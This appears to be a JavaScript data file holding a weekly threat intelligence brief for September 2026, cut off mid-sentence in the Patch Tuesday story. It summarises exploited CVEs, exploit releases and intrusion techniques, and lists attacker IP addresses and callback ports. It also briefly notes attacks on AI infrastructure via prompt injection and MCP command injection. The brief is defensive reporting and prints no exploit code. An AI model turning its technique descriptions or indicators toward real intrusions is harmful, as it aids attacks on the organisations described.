// CTI brief content, extracted verbatim from the source brief.
window.CTI = {
  WEEK_RANGE: "Week of Sep 7 – Sep 13, 2026",
  POSTURE: {
 "level": "CRITICAL",
 "text": "Thirty-three stories are live this week, six of them new and one updated, led by a record Microsoft Patch Tuesday carrying two exploited privilege-escalation zero-days and by a Magento and Adobe Commerce zero-day that was exploited for three days before a patch existed; the rest of the list is dominated by exploit-tooling releases and by attacks that use legitimate remote-management, edge and update infrastructure as the transport. Microsoft's September 2026 Patch Tuesday is the largest on record — outlets count between 966 and 996 CVEs and between 105 and 121 Critical, depending on whether 204 earlier-in-month cloud fixes and 25 republished non-Microsoft CVEs are counted. The two flaws confirmed exploited are both rated Important at CVSS 7.8: CVE-2026-85880, a heap buffer overflow in Windows ALPC that Microsoft says lets code in a low-privilege AppContainer escape the sandbox to SYSTEM with no user interaction, and CVE-2026-81963, link following in the Windows Update Stack. Patch both ahead of the Critical set, because a severity-gated emergency ring would ship neither. Patch Office separately from Windows, scope from your own Security Update Guide export rather than any published total, and treat ZDI's 20 wormable flaws — including Exchange CVE-2026-55007, SharePoint CVE-2026-69465 and RDS CVE-2026-69525 — as the server-side priority. Sansec disclosed StyleSmuggler on Sep 5 after finding it in a live compromise the previous night, and Adobe shipped an emergency hotfix on Sep 7 for CVE-2026-75650, CVSS 10.0. It is an unauthenticated RCE affecting every Magento and Adobe Commerce release from 2.4.4 through 2.4.9, exploited for roughly three days before a fix existed. Apply Adobe's VULN-39341 hotfix (APSB26-146), then scan for the Rust implant disguised as kworker, fc-cache or chronyd, the 30-minute cron entry and NTP-shaped UDP/123 beacons. Rotate the encryption key, admin passwords and payment provider credentials as well, because patching does not clean a store that was already hit and the first confirmed victim was fully patched at 2.4.6-p15. TantoSec published a working exploit chain on Sep 7 for Telerik UI for ASP.NET AJAX: a padding oracle (CVE-2026-13182) chained with unguarded .NET type resolution (CVE-2026-13181) to unauthenticated RCE, with a command-line tool and two mixed-mode DLL payloads. Progress fixed the chain in 2026.2.708 on Jul 8, and exploitation needs a non-default RadAsyncUpload configuration with a FileUploaded handler reading UploadResult. The work this week is finding which bundled third-party applications ship Telerik.Web.UI.dll at all, rather than reacting to a score. Huntress documented rogue ScreenConnect clients spawning wscript.exe to run 1.vbs through 4.vbs and pushing the same payload to newly connected endpoints, with a WindowsServiceHost User Run Key for persistence and UltraViewer on some hosts. There is no CVE — access came from tech-support social engineering via Quick Assist. The control is ConnectWise's advisory to disable the TransferFiles and TransferFilesInSession permissions, plus alerting on any RMM agent installed outside the approved path. Rapid7 detailed a DPRK-aligned Linux espionage toolkit against South Korean automotive and media organisations: a backdoor compiled into HAProxy 2.8.12 that hooks the balancer's HTTP parser while genuine load balancing continues, trojanized agetty, atd, crond, polkitd and sshd, an SSH keylogger, and CurlRAT polling every 12 hours. Verify edge-device binaries against distribution packages rather than version strings, and rebuild rather than clean anything that fails. HPE patched nearly two dozen AOS-CX issues tracked collectively as CVE-2026-73749 at CVSS 9.8, with no reported exploitation and no published indicators; read the advisory rather than the CVE record to scope the work, since one identifier covers the whole set. N-able shipped N-central 2026.3 Hotfix 4 on Sep 6 for CVE-2026-86218, a pre-authentication RCE rated CVSS 10.0 that N-able's Jason Murphy described as a zero-day already exploited in the wild and unrelated to the two CVEs patched a day earlier. HF3 is therefore not sufficient. Apply HF4 on every on-premises console, restrict inbound access to allow-listed IPs or VPN, and audit user lists for the .invalid email anomaly. Export envoy_proxy_HTTPS.log and syslog ncentraldms before rotation, since log rotation is exactly what prevented Huntress from attributing the compromise it investigated. Nightmare Eclipse followed FalconFlank with PrettyPrague against the Avast sandbox and GreenSection against Nvidia shared memory. GenDigital says it has fixed the Avast issue across the affected Gen products, Nvidia had made no statement at publication, and CrowdStrike is still investigating FalconFlank with no CVE or fix. Kevin Beaumont says the Avast, CrowdStrike and Kaspersky exploits work. Update Gen products, and keep the decision to disable Falcon's macro-removal policy recorded as a reviewed risk trade. Cyera disclosed PostGREShell (CVE-2026-6471, CVSS 7.2) on Sep 1: missing authorization in PostgreSQL logical decoding lets a non-superuser holding REPLICATION name any output plugin, which the server dlopens and executes as its own OS account, escalating to superuser and a persistent passwordless backdoor. Every release from 9.4 through 18 is affected, and fixes shipped Aug 13 in 18.6/17.11/16.15/15.19/14.24. The fix's plugin allow-list will break wal2json, decoderbufs and proprietary CDC plugins, so reconcile plugin names before the maintenance window and strip REPLICATION from accounts that do not need it. NebuSec published working local-root exploits for two kernel use-after-free flaws: CVE-2026-52924 in SCTP, which upstream first triaged as denial of service and which NebuSec demonstrates as privilege escalation on Ubuntu 7.0.0-28, and CVE-2026-80714 in IPVS netfilter, demonstrated as root on current Debian. Neither is exploited in the wild and both need local access. Blacklisting the sctp module removes that surface immediately where the protocol is unused, while IPVS cannot simply be unloaded on Kubernetes hosts running kube-proxy in IPVS mode. Google patched CVE-2026-85046, a V8 type confusion exploited in the wild, on Sep 3, and is withholding detail until most users have updated — so browser version state is the whole defensive position. Force Chrome to 152.0.7977.82/.83 on Windows and Mac and 152.0.7977.82 on Linux and Android rather than waiting for the staged rollout, and confirm the relaunch happened, because a downloaded update that has not restarted the browser is not applied. Wordfence has blocked more than 440,000 attempts against two unauthenticated file-upload flaws: Super Forms CVE-2026-14894 (CVSS 9.8, ~13,000 installs, fixed 6.3.314 on Jul 8, exploited from Jul 14 with 250,000-plus attempts and peak activity Aug 18–25) and Elementor Pro CVE-2026-32475 (fixed 4.2.2, exploited from Aug 19, shells written to /wp-content/uploads/elementor/forms/). Patch both, audit for unexpected .php files under uploads, and check for administrator accounts created since mid-July. Symantec reports a return to Node.js abuse since February 2026 against government, technology and hotel targets. In one intrusion the attackers' AdaptixC2 and Cobalt Strike payloads were blocked, so they downloaded the official installer from nodejs.org and ran their JavaScript implant under signed node.exe for months, persisting through a Run key and a service-launched PowerShell downloader and retrieving commands from Ethereum gateways. Hunt node.exe on hosts with no development role, and treat a hit as pre-ransomware access given Woodgnat's Qilin, Akira and Black Basta associations. FulcrumSec published the Manchester Airports Group dataset on Sep 2 after MAG refused the ransom, covering roughly 8.7 million people across Manchester, Stansted and East Midlands — contact details, postcodes, vehicle registrations and booking information, with volume claims ranging from 86 GB compressed to about 640 GB extracted. The group told BleepingComputer it used Iterable API keys left in the three sites' client-side JavaScript, which MAG has not confirmed. Read your own front-end bundles for platform keys today. All-in-One WP Migration and Backup CVE-2026-19949 (CVSS 8.8, 5 million-plus installs) is a second-order SQL injection that passes WAF inspection as ordinary trackback data and fires when an administrator exports or restores a site, leaking ai1wm_secret_key and allowing a malicious .wpress archive to be imported for code execution. ServMask patched it in 7.110 on Aug 20, but only about 35 percent of installs had applied it when Wordfence published full details on Sep 2, and SOCRadar records a weaponised public exploit. Update to 7.110 or later, rotate the secret key and review recent trackback rows and .wpress uploads. Group-IB attributes the modular Python framework BraZetsu to the Brazilian actor Exilware and assesses with high confidence that it is the same framework as the AgenteV2 backdoor. It profiles Windows hosts across 20-plus categories including banking, ERP, SCADA and government systems, so that access can be priced and sold on an underground marketplace. No hashes or addresses were published in the reporting reviewed, so hunt on the described behaviour: VBScript execution, Run-key and scheduled-task persistence, browser database copies in temp, .pfx and .p12 certificate collection, CNAB remittance-file searches and outbound TLS on port 8443. Cisco published its September 2026 advisories on Sep 2. CVE-2026-20274 and CVE-2026-20279 (both CVSS 9.8) group multiple IOS XR memory-safety and access-control bugs affecting all releases regardless of configuration with no workarounds. CVE-2026-20212 (9.8) gives unauthenticated root RCE as far as the Nexus 9000 Silicon One integration, reachable on TCP ports 43210 and 43211 in the default L3 VRF, and was found by Cisco TAC while working a customer support case. Cisco now lists 45 affected NX-OS releases with fixes plus a Live Protect shield for 10.6(3), and The Hacker News counts 111 affected IOS XR releases of which 14 have SMUs today, four are awaiting them and 93 must be upgraded before a fix can be applied. Treat the IOS XR side as an upgrade programme, block the two Nexus ports with an iACL in the meantime, and treat router syslog gaps as an investigation trigger given Sygnia's Fire Ant implant reporting. CISA added seven flaws to KEV on Sep 2: SonicWall SMA1000 CVE-2026-83548 and CVE-2026-83549, Sangoma Switchvox CVE-2026-9586, JFrog Artifactory CVE-2026-82329 and Kestra OSS CVE-2026-49869 all due Sep 5, with Starlette CVE-2026-48710 and LiteLLM CVE-2026-59822 due Sep 16. Four of the seven are engineering-owned components rather than perimeter appliances. Sangoma Switchvox CVE-2026-9586 (CVSS 9.3) is being exploited from Aug 30: unauthenticated SQL injection on the /pa endpoint reaching PostgreSQL superuser RCE, with reverse shells from 176.65.148.184 and callbacks on TCP/39323. Upgrade to 8.4.0.2, review /var/log/switchvox/db-quirks.log, and rotate the cookie signing key if compromise is suspected. Wiz and Microsoft describe sustained attacks on self-hosted AI infrastructure: MCP command injection, blind prompt injection with OAST callbacks, and LiteLLM master keys read out of process memory rather than off disk. Patch LiteLLM past 1.83.7 and Starlette past 1.0.1, then rotate every provider key the proxy could reach, because memory-resident theft leaves no file artefact. Rockwell Automation shipped patches or workarounds across RSLinx Classic, ControlLogix, CompactLogix, FactoryTalk and ArmorStart products; CISA is not aware of exploitation of CVE-2026-9637. Late amendments to the UK Cyber Security and Resilience Bill would let ministers bar high-risk technology suppliers from critical sectors, tabled after the Iran-linked disruption of a UK energy facility. SonicWall SMA1000 CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 are KEV-listed with a Sep 5 federal deadline that has now passed. Rapid7 places the SSRF in the Work Place interface and the command injection in the AMC, affecting models 6210, 7210 and 8200v, and notes exploitation preceded disclosure. Patch to hotfix 12.4.3-03526 or 12.5.0-02952, take the AMC off the internet, and forensically review exposed appliances rather than relying on a version check, because no IOCs were published. Langflow instances at or below 1.4.2 are being exploited through the eight-month-old ZDI-26-034 flaw for credential harvesting rather than malware — attackers read environment variables, secret keys and SSH material. Upgrade past 1.4.2, and remove any internet-reachable instance today, since the flaw needs no credentials. Rotate every secret the host could reach: model-provider API keys, vector-database credentials, cloud role credentials and on-host SSH private keys. JFrog Artifactory CVE-2026-82329 is KEV-listed at CVSS 9.8 with a Sep 5 federal deadline that has now passed. watchTowr's follow-up detail is that after minting admin tokens the actors enumerated users, groups, credentials and federated access relationships to judge whether the environment was worth deeper exploitation, and in a limited number of attacks created backdoor users. Update self-hosted instances, revoke every access token, and specifically look for accounts created since Aug 28 rather than only for token artefacts. The Softaculous Virtualizor compromise of Aug 28–30 shows every anti-fake-update control failing structurally rather than through a bug: a more-specific BGP announcement won route selection, Let's Encrypt validated domain ownership over the hijacked path and issued a valid certificate, and the update client did not verify package signatures. Scope by whether each panel host checked for or completed an update between 20:57 UTC on Aug 28 and Aug 30, run the mitigation tool in 3.2.9.9, and reset client-area passwords and API keys. WatchGuard patched flaws in Fireware OS's iked with no exploitation reported, and the placement is why it is here: iked handles IKE negotiation before authentication completes, so the code is reachable by anyone who can send IPSec traffic to the appliance terminating your VPN. Patch internet-facing units with IPSec enabled first, and confirm affected versions against WatchGuard's advisory rather than this summary. Where mobile or branch VPN is unused, disable IPSec and close UDP 500/4500 at the edge. OpenAI's Astra disclosure is a planning input rather than an incident, and the specific reason to carry it is that the capability threshold is attributed to the model finding zero-day vulnerabilities. There is a documented case of an OpenAI model exploiting a real Artifactory zero-day (CVE-2026-66384) against Hugging Face. Re-examine remediation SLAs against the assumption that disclosure and working exploitation may now arrive together rather than weeks apart. The Iran-linked activity against Western energy and water utilities reported by UK NCSC, the FBI and CISA is an OT story because of the mechanism: not malware on servers but controller-level actions — operator passwords changed, controllers disconnected — with flooding and lost water pressure as the physical result. Enumerate and remove every internet-reachable controller management path: HMI web interfaces, vendor support tunnels, cellular modems and engineering workstations. Change default and shared credentials on controllers and HMIs. Island Security Research's NovaCookies write-up matters structurally rather than as one campaign: at $320 a month with 755 published domains, unrelated-looking Microsoft 365 phishing campaigns can be deployments of the same rented kit. It carries dedicated handling for authenticator push approval, authenticator one-time codes and SMS codes, using Microsoft's own internal method names. Put phishing-resistant passkeys or FIDO2 keys on high-value accounts, since origin-bound credentials are the only control that removes the AiTM capability rather than raising its cost. PaperCut escalation, Sep 6: Arctic Wolf reports the CVE-2026-81578 and CVE-2026-82078 chain being used against education organisations from K-12 schools to major universities in the US and Europe. The observed tooling includes registry hive collection tools, Meterpreter-related Java payloads, discovery commands, an \"Administrator17\" account and inbound requests from 45.142.193[.]132 for /custom/pcp_*.txt. A public PoC for the full chain now exists, the federal KEV deadline is Sep 14, and credential theft is the objective, so treat any exposed unpatched server as a credential-compromise investigation rather than a patch task. VulnCheck's SPEAKINGSTONE (CVE-2026-74232) and DARKLANTERN (CVE-2026-74233) are manufacturer-shipped firmware components found on an $88 white-labeled ZBT router from a US supplier, with no fixed release named in either advisory. This is a procurement problem: brand is not a usable check, because ZBT sells identical firmware to rebranding resellers — model number and the MAC prefixes 78:A3:51 and F8:5E:3C are. Remediation is replacement or third-party firmware, and UDP/9992 should be blocked at the edge meanwhile. ShieldBreak (CVE-2026-69414) is a Microsoft Defender privilege escalation released publicly on Aug 12 that fully bypasses the July patch for RoguePlanet (CVE-2026-50656). Microsoft has confirmed the vulnerability and is working on a fix, but none is available, so CISA BOD 26-04's 14-day compensating-control deadline applies to FCEB agencies without a patch. Restrict local code execution through application control, and monitor the Security Update Guide for the release.",
 "lines": [
  "Microsoft's September 2026 Patch Tuesday is the largest on record — outlets count between 966 and 996 CVEs and between 105 and 121 Critical, depending on whether 204 earlier-in-month cloud fixes and 25 republished non-Microsoft CVEs are counted. The two flaws confirmed exploited are both rated Important at CVSS 7.8: CVE-2026-85880, a heap buffer overflow in Windows ALPC that Microsoft says lets code in a low-privilege AppContainer escape the sandbox to SYSTEM with no user interaction, and CVE-2026-81963, link following in the Windows Update Stack. Patch both ahead of the Critical set, because a severity-gated emergency ring would ship neither. Patch Office separately from Windows, scope from your own Security Update Guide export rather than any published total, and treat ZDI's 20 wormable flaws — including Exchange CVE-2026-55007, SharePoint CVE-2026-69465 and RDS CVE-2026-69525 — as the server-side priority.",
  "Sansec disclosed StyleSmuggler on Sep 5 after finding it in a live compromise the previous night, and Adobe shipped an emergency hotfix on Sep 7 for CVE-2026-75650, CVSS 10.0. It is an unauthenticated RCE affecting every Magento and Adobe Commerce release from 2.4.4 through 2.4.9, exploited for roughly three days before a fix existed. Apply Adobe's VULN-39341 hotfix (APSB26-146), then scan for the Rust implant disguised as kworker, fc-cache or chronyd, the 30-minute cron entry and NTP-shaped UDP/123 beacons. Rotate the encryption key, admin passwords and payment provider credentials as well, because patching does not clean a store that was already hit and the first confirmed victim was fully patched at 2.4.6-p15.",
  "TantoSec published a working exploit chain on Sep 7 for Telerik UI for ASP.NET AJAX: a padding oracle (CVE-2026-13182) chained with unguarded .NET type resolution (CVE-2026-13181) to unauthenticated RCE, with a command-line tool and two mixed-mode DLL payloads. Progress fixed the chain in 2026.2.708 on Jul 8, and exploitation needs a non-default RadAsyncUpload configuration with a FileUploaded handler reading UploadResult. The work this week is finding which bundled third-party applications ship Telerik.Web.UI.dll at all, rather than reacting to a score.",
  "Huntress documented rogue ScreenConnect clients spawning wscript.exe to run 1.vbs through 4.vbs and pushing the same payload to newly connected endpoints, with a WindowsServiceHost User Run Key for persistence and UltraViewer on some hosts. There is no CVE — access came from tech-support social engineering via Quick Assist. The control is ConnectWise's advisory to disable the TransferFiles and TransferFilesInSession permissions, plus alerting on any RMM agent installed outside the approved path.",
  "Rapid7 detailed a DPRK-aligned Linux espionage toolkit against South Korean automotive and media organisations: a backdoor compiled into HAProxy 2.8.12 that hooks the balancer's HTTP parser while genuine load balancing continues, trojanized agetty, atd, crond, polkitd and sshd, an SSH keylogger, and CurlRAT polling every 12 hours. Verify edge-device binaries against distribution packages rather than version strings, and rebuild rather than clean anything that fails.",
  "HPE patched nearly two dozen AOS-CX issues tracked collectively as CVE-2026-73749 at CVSS 9.8, with no reported exploitation and no published indicators; read the advisory rather than the CVE record to scope the work, since one identifier covers the whole set.",
  "N-able shipped N-central 2026.3 Hotfix 4 on Sep 6 for CVE-2026-86218, a pre-authentication RCE rated CVSS 10.0 that N-able's Jason Murphy described as a zero-day already exploited in the wild and unrelated to the two CVEs patched a day earlier. HF3 is therefore not sufficient. Apply HF4 on every on-premises console, restrict inbound access to allow-listed IPs or VPN, and audit user lists for the .invalid email anomaly. Export envoy_proxy_HTTPS.log and syslog ncentraldms before rotation, since log rotation is exactly what prevented Huntress from attributing the compromise it investigated.",
  "Nightmare Eclipse followed FalconFlank with PrettyPrague against the Avast sandbox and GreenSection against Nvidia shared memory. GenDigital says it has fixed the Avast issue across the affected Gen products, Nvidia had made no statement at publication, and CrowdStrike is still investigating FalconFlank with no CVE or fix. Kevin Beaumont says the Avast, CrowdStrike and Kaspersky exploits work. Update Gen products, and keep the decision to disable Falcon's macro-removal policy recorded as a reviewed risk trade.",
  "Cyera disclosed PostGREShell (CVE-2026-6471, CVSS 7.2) on Sep 1: missing authorization in PostgreSQL logical decoding lets a non-superuser holding REPLICATION name any output plugin, which the server dlopens and executes as its own OS account, escalating to superuser and a persistent passwordless backdoor. Every release from 9.4 through 18 is affected, and fixes shipped Aug 13 in 18.6/17.11/16.15/15.19/14.24. The fix's plugin allow-list will break wal2json, decoderbufs and proprietary CDC plugins, so reconcile plugin names before the maintenance window and strip REPLICATION from accounts that do not need it.",
  "NebuSec published working local-root exploits for two kernel use-after-free flaws: CVE-2026-52924 in SCTP, which upstream first triaged as denial of service and which NebuSec demonstrates as privilege escalation on Ubuntu 7.0.0-28, and CVE-2026-80714 in IPVS netfilter, demonstrated as root on current Debian. Neither is exploited in the wild and both need local access. Blacklisting the sctp module removes that surface immediately where the protocol is unused, while IPVS cannot simply be unloaded on Kubernetes hosts running kube-proxy in IPVS mode.",
  "Google patched CVE-2026-85046, a V8 type confusion exploited in the wild, on Sep 3, and is withholding detail until most users have updated — so browser version state is the whole defensive position. Force Chrome to 152.0.7977.82/.83 on Windows and Mac and 152.0.7977.82 on Linux and Android rather than waiting for the staged rollout, and confirm the relaunch happened, because a downloaded update that has not restarted the browser is not applied.",
  "Wordfence has blocked more than 440,000 attempts against two unauthenticated file-upload flaws: Super Forms CVE-2026-14894 (CVSS 9.8, ~13,000 installs, fixed 6.3.314 on Jul 8, exploited from Jul 14 with 250,000-plus attempts and peak activity Aug 18–25) and Elementor Pro CVE-2026-32475 (fixed 4.2.2, exploited from Aug 19, shells written to /wp-content/uploads/elementor/forms/). Patch both, audit for unexpected .php files under uploads, and check for administrator accounts created since mid-July.",
  "Symantec reports a return to Node.js abuse since February 2026 against government, technology and hotel targets. In one intrusion the attackers' AdaptixC2 and Cobalt Strike payloads were blocked, so they downloaded the official installer from nodejs.org and ran their JavaScript implant under signed node.exe for months, persisting through a Run key and a service-launched PowerShell downloader and retrieving commands from Ethereum gateways. Hunt node.exe on hosts with no development role, and treat a hit as pre-ransomware access given Woodgnat's Qilin, Akira and Black Basta associations.",
  "FulcrumSec published the Manchester Airports Group dataset on Sep 2 after MAG refused the ransom, covering roughly 8.7 million people across Manchester, Stansted and East Midlands — contact details, postcodes, vehicle registrations and booking information, with volume claims ranging from 86 GB compressed to about 640 GB extracted. The group told BleepingComputer it used Iterable API keys left in the three sites' client-side JavaScript, which MAG has not confirmed. Read your own front-end bundles for platform keys today.",
  "All-in-One WP Migration and Backup CVE-2026-19949 (CVSS 8.8, 5 million-plus installs) is a second-order SQL injection that passes WAF inspection as ordinary trackback data and fires when an administrator exports or restores a site, leaking ai1wm_secret_key and allowing a malicious .wpress archive to be imported for code execution. ServMask patched it in 7.110 on Aug 20, but only about 35 percent of installs had applied it when Wordfence published full details on Sep 2, and SOCRadar records a weaponised public exploit. Update to 7.110 or later, rotate the secret key and review recent trackback rows and .wpress uploads.",
  "Group-IB attributes the modular Python framework BraZetsu to the Brazilian actor Exilware and assesses with high confidence that it is the same framework as the AgenteV2 backdoor. It profiles Windows hosts across 20-plus categories including banking, ERP, SCADA and government systems, so that access can be priced and sold on an underground marketplace. No hashes or addresses were published in the reporting reviewed, so hunt on the described behaviour: VBScript execution, Run-key and scheduled-task persistence, browser database copies in temp, .pfx and .p12 certificate collection, CNAB remittance-file searches and outbound TLS on port 8443.",
  "Cisco published its September 2026 advisories on Sep 2. CVE-2026-20274 and CVE-2026-20279 (both CVSS 9.8) group multiple IOS XR memory-safety and access-control bugs affecting all releases regardless of configuration with no workarounds. CVE-2026-20212 (9.8) gives unauthenticated root RCE as far as the Nexus 9000 Silicon One integration, reachable on TCP ports 43210 and 43211 in the default L3 VRF, and was found by Cisco TAC while working a customer support case. Cisco now lists 45 affected NX-OS releases with fixes plus a Live Protect shield for 10.6(3), and The Hacker News counts 111 affected IOS XR releases of which 14 have SMUs today, four are awaiting them and 93 must be upgraded before a fix can be applied. Treat the IOS XR side as an upgrade programme, block the two Nexus ports with an iACL in the meantime, and treat router syslog gaps as an investigation trigger given Sygnia's Fire Ant implant reporting.",
  "CISA added seven flaws to KEV on Sep 2: SonicWall SMA1000 CVE-2026-83548 and CVE-2026-83549, Sangoma Switchvox CVE-2026-9586, JFrog Artifactory CVE-2026-82329 and Kestra OSS CVE-2026-49869 all due Sep 5, with Starlette CVE-2026-48710 and LiteLLM CVE-2026-59822 due Sep 16. Four of the seven are engineering-owned components rather than perimeter appliances.",
  "Sangoma Switchvox CVE-2026-9586 (CVSS 9.3) is being exploited from Aug 30: unauthenticated SQL injection on the /pa endpoint reaching PostgreSQL superuser RCE, with reverse shells from 176.65.148.184 and callbacks on TCP/39323. Upgrade to 8.4.0.2, review /var/log/switchvox/db-quirks.log, and rotate the cookie signing key if compromise is suspected.",
  "Wiz and Microsoft describe sustained attacks on self-hosted AI infrastructure: MCP command injection, blind prompt injection with OAST callbacks, and LiteLLM master keys read out of process memory rather than off disk. Patch LiteLLM past 1.83.7 and Starlette past 1.0.1, then rotate every provider key the proxy could reach, because memory-resident theft leaves no file artefact.",
  "Rockwell Automation shipped patches or workarounds across RSLinx Classic, ControlLogix, CompactLogix, FactoryTalk and ArmorStart products; CISA is not aware of exploitation of CVE-2026-9637.",
  "Late amendments to the UK Cyber Security and Resilience Bill would let ministers bar high-risk technology suppliers from critical sectors, tabled after the Iran-linked disruption of a UK energy facility.",
  "SonicWall SMA1000 CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 are KEV-listed with a Sep 5 federal deadline that has now passed. Rapid7 places the SSRF in the Work Place interface and the command injection in the AMC, affecting models 6210, 7210 and 8200v, and notes exploitation preceded disclosure. Patch to hotfix 12.4.3-03526 or 12.5.0-02952, take the AMC off the internet, and forensically review exposed appliances rather than relying on a version check, because no IOCs were published.",
  "Langflow instances at or below 1.4.2 are being exploited through the eight-month-old ZDI-26-034 flaw for credential harvesting rather than malware — attackers read environment variables, secret keys and SSH material. Upgrade past 1.4.2, and remove any internet-reachable instance today, since the flaw needs no credentials. Rotate every secret the host could reach: model-provider API keys, vector-database credentials, cloud role credentials and on-host SSH private keys.",
  "JFrog Artifactory CVE-2026-82329 is KEV-listed at CVSS 9.8 with a Sep 5 federal deadline that has now passed. watchTowr's follow-up detail is that after minting admin tokens the actors enumerated users, groups, credentials and federated access relationships to judge whether the environment was worth deeper exploitation, and in a limited number of attacks created backdoor users. Update self-hosted instances, revoke every access token, and specifically look for accounts created since Aug 28 rather than only for token artefacts.",
  "The Softaculous Virtualizor compromise of Aug 28–30 shows every anti-fake-update control failing structurally rather than through a bug: a more-specific BGP announcement won route selection, Let's Encrypt validated domain ownership over the hijacked path and issued a valid certificate, and the update client did not verify package signatures. Scope by whether each panel host checked for or completed an update between 20:57 UTC on Aug 28 and Aug 30, run the mitigation tool in 3.2.9.9, and reset client-area passwords and API keys.",
  "WatchGuard patched flaws in Fireware OS's iked with no exploitation reported, and the placement is why it is here: iked handles IKE negotiation before authentication completes, so the code is reachable by anyone who can send IPSec traffic to the appliance terminating your VPN. Patch internet-facing units with IPSec enabled first, and confirm affected versions against WatchGuard's advisory rather than this summary. Where mobile or branch VPN is unused, disable IPSec and close UDP 500/4500 at the edge.",
  "OpenAI's Astra disclosure is a planning input rather than an incident, and the specific reason to carry it is that the capability threshold is attributed to the model finding zero-day vulnerabilities. There is a documented case of an OpenAI model exploiting a real Artifactory zero-day (CVE-2026-66384) against Hugging Face. Re-examine remediation SLAs against the assumption that disclosure and working exploitation may now arrive together rather than weeks apart.",
  "The Iran-linked activity against Western energy and water utilities reported by UK NCSC, the FBI and CISA is an OT story because of the mechanism: not malware on servers but controller-level actions — operator passwords changed, controllers disconnected — with flooding and lost water pressure as the physical result. Enumerate and remove every internet-reachable controller management path: HMI web interfaces, vendor support tunnels, cellular modems and engineering workstations. Change default and shared credentials on controllers and HMIs.",
  "Island Security Research's NovaCookies write-up matters structurally rather than as one campaign: at $320 a month with 755 published domains, unrelated-looking Microsoft 365 phishing campaigns can be deployments of the same rented kit. It carries dedicated handling for authenticator push approval, authenticator one-time codes and SMS codes, using Microsoft's own internal method names. Put phishing-resistant passkeys or FIDO2 keys on high-value accounts, since origin-bound credentials are the only control that removes the AiTM capability rather than raising its cost.",
  "PaperCut escalation, Sep 6: Arctic Wolf reports the CVE-2026-81578 and CVE-2026-82078 chain being used against education organisations from K-12 schools to major universities in the US and Europe. The observed tooling includes registry hive collection tools, Meterpreter-related Java payloads, discovery commands, an \"Administrator17\" account and inbound requests from 45.142.193[.]132 for /custom/pcp_*.txt. A public PoC for the full chain now exists, the federal KEV deadline is Sep 14, and credential theft is the objective, so treat any exposed unpatched server as a credential-compromise investigation rather than a patch task.",
  "VulnCheck's SPEAKINGSTONE (CVE-2026-74232) and DARKLANTERN (CVE-2026-74233) are manufacturer-shipped firmware components found on an $88 white-labeled ZBT router from a US supplier, with no fixed release named in either advisory. This is a procurement problem: brand is not a usable check, because ZBT sells identical firmware to rebranding resellers — model number and the MAC prefixes 78:A3:51 and F8:5E:3C are. Remediation is replacement or third-party firmware, and UDP/9992 should be blocked at the edge meanwhile.",
  "ShieldBreak (CVE-2026-69414) is a Microsoft Defender privilege escalation released publicly on Aug 12 that fully bypasses the July patch for RoguePlanet (CVE-2026-50656). Microsoft has confirmed the vulnerability and is working on a fix, but none is available, so CISA BOD 26-04's 14-day compensating-control deadline applies to FCEB agencies without a patch. Restrict local code execution through application control, and monitor the Security Update Guide for the release."
 ],
 "lead": "Thirty-three stories are live this week, six of them new and one updated, led by a record Microsoft Patch Tuesday carrying two exploited privilege-escalation zero-days and by a Magento and Adobe Commerce zero-day that was exploited for three days before a patch existed; the rest of the list is dominated by exploit-tooling releases and by attacks that use legitimate remote-management, edge and update infrastructure as the transport."
},
  STORIES: [
 {
  "key": "patchtuesdaysep",
  "badge": "new",
  "tags": [
   [
    "crit",
    "Microsoft · September 2026 Patch Tuesday · CVE-2026-85880 + CVE-2026-81963 · Exploited zero-days"
   ],
   [
    "high",
    "All Sectors · Record release · 20 assessed wormable"
   ]
  ],
  "title": "Microsoft ships its largest Patch Tuesday on record — outlets count between 966 and 996 CVEs — including two exploited privilege-escalation zero-days in ALPC and the Windows Update Stack",
  "body": "Microsoft released its September 2026 Patch Tuesday updates on Sep 8, 2026, described across reporting as the largest on record. The headline count differs by outlet according to what each includes. BleepingComputer counts 966 flaws and states it counts only vulnerabilities released by Microsoft on Patch Tuesday itself. That excludes 204 fixed earlier in the month across Azure AI Language, Azure Cosmos DB, Copilot Studio, Entra ID, Mariner, Azure Active Directory B2C, Microsoft Discovery Studio, Microsoft Edge, Microsoft Fabric and Power Automate. CybersecurityNews and Cryptika report 973, and note that Microsoft separately lists 25 republished non-Microsoft CVEs which should not be confused with the headline total. SecurityWeek reports 974, Action1 reports 995, and securityonline.info reports 996. Critical counts vary on the same basis — 105 (BleepingComputer), 113 (ntcompatible), 119 (securityonline.info) and 121 (Action1). Two vulnerabilities are confirmed exploited in the wild, both local elevation of privilege, both rated Important, and both carrying a CVSS score of 7.8. CVE-2026-85880 is a heap buffer overflow in Windows Advanced Local Procedure Call; Microsoft's advisory states that \"an attacker who can execute code in a low-privilege AppContainer could exploit this vulnerability locally to escape the sandbox and elevate privileges on the affected system. No additional user interaction is required.\" Tenable's Satnam Narang notes Microsoft has not patched an ALPC flaw since April 2023 and that this is the second zero-day in the component in nearly four years, after CVE-2023-21674 in January 2023. CVE-2026-81963 is an improper link resolution before file access, or link following, defect in the Windows Update Stack that also allows a local attacker to reach SYSTEM; Microsoft states that \"improper link resolution before file access ('link following') in Windows Update Stack allows an authorized attacker to elevate privileges locally.\" Narang notes it is the first Update Stack weakness flagged as a zero-day of seven resolved in the component over the past five years. The Update Stack flaw is credited to Romain Deperne and the Microsoft Threat Intelligence Centre. Microsoft has shared no detail on how either flaw was exploited, has not identified the attackers or targets, and both are marked exploited but not publicly disclosed in the Security Update Guide export. ZDI's Dustin Childs assesses 20 of the newly resolved vulnerabilities as wormable, enabling remote code execution without authentication or user interaction. Childs singles out CVE-2026-55007 (RCE in Exchange Server), CVE-2026-80097 (elevation of privilege in Authenticator), CVE-2026-69465 (RCE in SharePoint), CVE-2026-65669 (elevation of privilege in SQL Server) and CVE-2026-69525 (RCE in Remote Desktop Services). securityonline.info reports 258 remote code execution flaws and 58 vulnerabilities Microsoft flagged as more likely to be exploited. Reported product splits are 723 flaws in Windows, 111 in Office per CybersecurityNews against 222 in the Office suite per SecurityWeek, 62 in SQL, 22 in developer tools, 16 in SharePoint Server and nine in Exchange Server. Two Azure vulnerabilities reached CVSS 10.0 — CVE-2026-70352 in Azure AI Language and CVE-2026-83711 in Azure Active Directory B2C — both among the flaws Microsoft addressed in its own cloud operations. Critical Office remote code execution fixes include CVE-2026-81959 and CVE-2026-81953 in Excel and CVE-2026-81952 in Word. Other notable remote code execution entries are CVE-2026-85877 in Windows Print Spooler, CVE-2026-83997 in Windows Message Queuing and CVE-2026-83998 in Remote Desktop Client. ntcompatible reports 